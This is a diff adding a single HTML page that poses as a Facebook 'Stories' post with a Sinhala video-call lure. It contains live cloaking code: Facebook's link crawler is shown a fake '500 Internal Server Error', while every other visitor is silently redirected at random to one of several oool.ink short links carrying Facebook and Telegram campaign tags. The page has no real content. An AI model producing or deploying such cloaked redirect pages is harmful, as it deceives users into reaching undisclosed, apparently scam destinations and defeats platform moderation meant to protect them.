@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>💥Stories November 08 - Facebook</title>
+    <meta name="title" content="💥Stories November 08 - Facebook">
+    <meta name="description" content="මට මේක ඔබලා Video Call එකක් ගන්න.">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ProphetJerom.github.io/jesus-nov8">
+    <meta property="og:title" content="💥Stories November 08 - Facebook">
+    <meta property="og:description" content="මට මේක ඔබලා Video Call එකක් ගන්න.">
+    <meta property="og:image" content="https://ProphetJerom.github.io/jesus-nov8/og.jpg">
+    
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+
+            // Otherwise, redirect to a random page
+            const pages = [
+                "https://oool.ink/spabadu-github/?utm_source=facebook&utm_campaign=post_id_nov8",
+                "https://oool.ink/badu9-github",
+                "https://oool.ink/spabadu-github/?utm_source=telegram&utm_campaign=post_id_nov8"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
